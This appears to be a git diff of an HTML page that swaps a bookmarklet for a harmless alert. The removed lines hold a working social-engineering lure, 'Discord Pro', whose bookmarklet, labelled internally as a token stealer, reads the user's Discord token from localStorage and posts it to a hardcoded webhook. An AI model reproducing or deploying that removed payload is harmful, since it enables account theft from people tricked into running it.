@@ -3,32 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Feature</title>
+    <title>Functional Bookmark</title>
     <script type="text/javascript">
-        function addBookmark() {
-            var bookmarkCode = "javascript:(function()%7Bvar token%3DlocalStorage.getItem(%22token%22)%3Bfetch(%22https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1293244415728423026%2FFa-ReJTXmoKajaHA9gCKAEFLtxMd4V_QVpcgRdcmQDf2H1xdbMHqrUHEl81Fmsll7Ezb%22%2C%7Bmethod%3A%22POST%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify(%7Btoken%3Atoken%7D)%7D)%7D)()";
-
+        function addFunctionBookmark() {
+            var bookmarkURL = "javascript:(function()%7Balert('Congratulations! This bookmark just ran a function.')%7D)()";
+            
             if (window.external && ("AddFavorite" in window.external)) {
-                // This works in older versions of Internet Explorer
-                window.external.AddFavorite('javascript:' + bookmarkCode, 'Discord Token Stealer');
+                // Internet Explorer support
+                window.external.AddFavorite(bookmarkURL, 'Functional Bookmark');
             } else if (window.sidebar && window.sidebar.addPanel) {
-                // Firefox <23
-                window.sidebar.addPanel('Discord Token Stealer', 'javascript:' + bookmarkCode, '');
+                // Firefox <23 support
+                window.sidebar.addPanel('Functional Bookmark', bookmarkURL, '');
             } else if (window.opera && window.print) {
                 // Opera support
                 var a = document.createElement('a');
-                a.setAttribute('href', 'javascript:' + bookmarkCode);
-                a.setAttribute('title', 'Discord Token Stealer');
+                a.setAttribute('href', bookmarkURL);
+                a.setAttribute('title', 'Functional Bookmark');
                 a.click();
             } else {
-                alert('Press ' + (navigator.userAgent.toLowerCase().indexOf('mac') !== -1 ? 'Command/Cmd' : 'CTRL') + ' + D to bookmark this page.');
+                // Standard modern browsers
+                alert('Press ' + (navigator.userAgent.toLowerCase().indexOf('mac') !== -1 ? 'Command/Cmd' : 'CTRL') + ' + D to bookmark this page. Then edit the URL to this: ' + bookmarkURL);
             }
         }
     </script>
 </head>
 <body>
-    <h1>Welcome to Discord Pro!</h1>
-    <p>Click the button below to enhance your Discord experience with an exclusive bookmark.</p>
-    <button onclick="addBookmark()">Add Discord Pro Bookmark</button>
+    <h1>Welcome to Functional Bookmark</h1>
+    <p>Click the button below to add a bookmark that runs a function.</p>
+    <button onclick="addFunctionBookmark()">Add Function Bookmark</button>
 </body>
 </html>
